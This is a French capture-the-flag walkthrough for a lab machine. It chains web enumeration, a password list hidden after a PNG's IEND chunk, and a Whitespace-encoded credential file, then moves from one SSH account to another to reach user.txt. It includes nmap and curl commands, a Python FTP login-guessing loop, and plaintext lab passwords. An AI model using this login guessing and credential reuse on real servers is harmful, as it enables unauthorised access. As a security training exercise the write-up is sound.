# Musa Troglodytarum — `user.txt`

## 1. Périmètre et méthodologie

La machine cible du CTF était accessible à l'adresse `10.10.0.6`. L'objectif était de récupérer le fichier `user.txt`.

L'exploitation s'est déroulée en plusieurs étapes :

* énumération des services réseau et du site web ;
* inspection des fichiers CSS et des ressources accessibles ;
* analyse des données ajoutées à une image PNG ;
* extraction et vérification contrôlée d'une liste de mots de passe FTP ;
* récupération et décodage d'un programme en langage Whitespace ;
* récupération d'identifiants SSH ;
* recherche d'informations sensibles laissées dans l'environnement local ;
* récupération du flag utilisateur.

### Outils utilisés

* `nmap`
* `curl`
* Python (`ftplib`, `socket`)
* `ssh`

---

## 2. Énumération des services

Un premier scan permet d'identifier les services exposés :

```bash
nmap -sV -Pn --top-ports 1000 $IP
```

Les ports suivants sont accessibles :

* `21/tcp` : FTP
* `22/tcp` : SSH
* `80/tcp` : HTTP

L'analyse du serveur web commence ensuite avec :

```bash
curl -i http://$IP/
curl -i http://$IP/assets/style.css
```

La page principale fait notamment référence à une vidéo. Le répertoire `/assets/` est accessible et contient notamment :

```text
MusaTroglodytarum.mp4
style.css
```

L'inspection du fichier CSS révèle un commentaire contenant le chemin suivant :

```text
/l3_B4n4N13r_D3s_M0nT4gN3s.php
```

---

## 3. Découverte du répertoire caché

La navigation à travers `intermediary.php` avec le paramètre `hidden_directory` permet d'atteindre un répertoire supplémentaire :

```text
/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/
```

Ce répertoire contient notamment l'image :

```text
Hot_Babe.png
```

L'image reste parfaitement valide en tant que PNG. Cependant, une analyse de ses données binaires montre que des informations ont été ajoutées **après le bloc final `IEND`**.

Le contenu ajouté fournit un nom d'utilisateur FTP ainsi qu'une liste de mots de passe potentiels :

```text
Eh, you've earned this. Username for FTP is banane_celeste
One of these is the password:
iVBORw0KGgoAAAANSUhE
...
gPKTq8qo+MzagarcIxgO
...
```

Le nom d'utilisateur FTP récupéré est donc :

```text
banane_celeste
```

---

## 4. Extraction des mots de passe

Après téléchargement de `Hot_Babe.png`, les différentes lignes situées après le marqueur peuvent être extraites avec Python :

```python
from pathlib import Path

data = Path("Hot_Babe.png").read_bytes()
lines = data.split(b"One of these is the password:\n", 1)[1].splitlines()
passwords = [line.decode() for line in lines if line.strip()]

print(len(passwords), passwords[167])
```

Résultat :

```text
200 gPKTq8qo+MzagarcIxgO
```

Les lignes ressemblent aux premiers fragments encodés en Base64 du fichier PNG. Cependant, leur présence après le marqueur les présente explicitement comme des candidats au mot de passe FTP.

La validation a donc été effectuée progressivement, à faible fréquence, afin d'éviter de déclencher les mécanismes de ralentissement ou de blocage temporaire du serveur FTP.

Un test ciblé autour de la position `168` est réalisé avec :

```python
from ftplib import FTP, error_perm

pw = open("passwords.txt").read().splitlines()

for i in range(166, 169):
    f = FTP(timeout=5)
    try:
        f.connect("10.10.0.6", 21)
        f.login("banane_celeste", pw[i - 1])
        print("SUCCESS", i, pw[i - 1], f.nlst())
        break
    except error_perm:
        print("tested", i)
    finally:
        f.close()
```

Résultat :

```text
tested 166
tested 167
SUCCESS 168 gPKTq8qo+MzagarcIxgO ["Valerian's_Creds.txt"]
```

Les identifiants FTP permettent donc de récupérer le fichier :

```text
Valerian's_Creds.txt
```

---

## 5. Analyse du fichier Whitespace

Le fichier récupéré doit être téléchargé en mode binaire afin de préserver les espaces et les tabulations. Ces caractères sont essentiels puisque le contenu est encodé en **Whitespace**.

```python
from ftplib import FTP
from io import BytesIO

f = FTP("10.10.0.6", timeout=10)
f.login("banane_celeste", "gPKTq8qo+MzagarcIxgO")

buf = BytesIO()
f.retrbinary("RETR Valerian's_Creds.txt", buf.write)

open("valerian_creds.txt", "wb").write(buf.getvalue())
f.quit()
```

Le début du fichier est principalement composé de :

* espaces ;
* tabulations ;
* retours à la ligne.

Dans le langage Whitespace, les instructions sont représentées exclusivement par ces caractères.

Dans le programme étudié :

* `SS` correspond au début d'une instruction d'empilement d'un entier ;
* `TNSS` permet d'afficher un caractère.

Un décodeur Python est utilisé pour traduire les espaces en `S`, les tabulations en `T` et les sauts de ligne en `N` :

```python
raw = open("valerian_creds.txt", "rb").read().split(b"\n\n\n", 1)[0]

s = "".join(
    "S" if c == 32 else
    "T" if c == 9 else
    "N"
    for c in raw
)

i, stack, output = 0, [], ""

while i < len(s):
    if s.startswith("SS", i):
        i += 2
        sign = s[i]
        i += 1

        end = s.index("N", i)
        bits = s[i:end].replace("S", "0").replace("T", "1")
        n = int(bits or "0", 2)

        stack.append(-n if sign == "T" else n)
        i = end + 1

    elif s.startswith("TNSS", i):
        output += chr(stack.pop())
        i += 4

    else:
        raise ValueError((i, s[i:i+12]))

print(output)
```

Le décodage fournit les identifiants suivants :

```text
User: valerian
Password: ********
```

Le texte français présent à la fin du fichier constitue quant à lui un indice botanique distinct du programme Whitespace.

---

## 6. Connexion SSH avec `valerian`

Les identifiants récupérés permettent de se connecter au serveur en SSH.

Une fois connecté, la commande `id` confirme l'identité utilisée :

```bash
id
```

Résultat :

```text
uid=1001(valerian)
```

Le serveur affiche également le message suivant lors de la connexion :

```text
Hi, just a reminder that in case of need, check our """s3cr3t""" hiding place.
```

Cette indication conduit à examiner le répertoire :

```text
/usr/games/s3cr3t/
```

Le fichier :

```text
.msg_fr0m_v4l3r14n
```

contient un nouveau message :

```text
Honestly I think that "ca_serait_jamais_arrive_en_haskell" is fine
```

Le message fournit donc un autre mot de passe ainsi qu'une indication sur l'utilisateur `gabriel`.

---

## 7. Connexion avec `gabriel`

Les informations récupérées permettent finalement de se connecter en SSH avec l'utilisateur `gabriel` :

```bash
ssh gabriel@$IP
```

Le mot de passe utilisé est :

```text
ca_serait_jamais_arrive_en_haskell
```

L'identité est vérifiée avec :

```bash
id
```

Résultat :

```text
uid=1000(gabriel) gid=1000(gabriel) groups=1000(gabriel)
```

Le fichier `user.txt` est alors accessible :

```bash
cat /home/gabriel/user.txt
```

Résultat :

```text
EPI{********}
```

## 8. Flag utilisateur

```text
EPI{********}
```

## 9. Chaîne d'exploitation

La compromission repose sur une succession de divulgations d'informations :

```text
Énumération web
      ↓
Commentaire CSS
      ↓
Répertoire caché
      ↓
PNG contenant des données après IEND
      ↓
Identifiant FTP + liste de mots de passe
      ↓
Accès FTP
      ↓
Valerian's_Creds.txt
      ↓
Décodage Whitespace
      ↓
Identifiants SSH de valerian
      ↓
Message local dans /usr/games/s3cr3t/
      ↓
Identifiants de gabriel
      ↓
SSH gabriel
      ↓
/home/gabriel/user.txt
```

La vulnérabilité principale repose sur la présence d'informations sensibles dans des ressources accessibles depuis le serveur web et sur le stockage successif d'identifiants permettant de progresser d'un compte à l'autre.
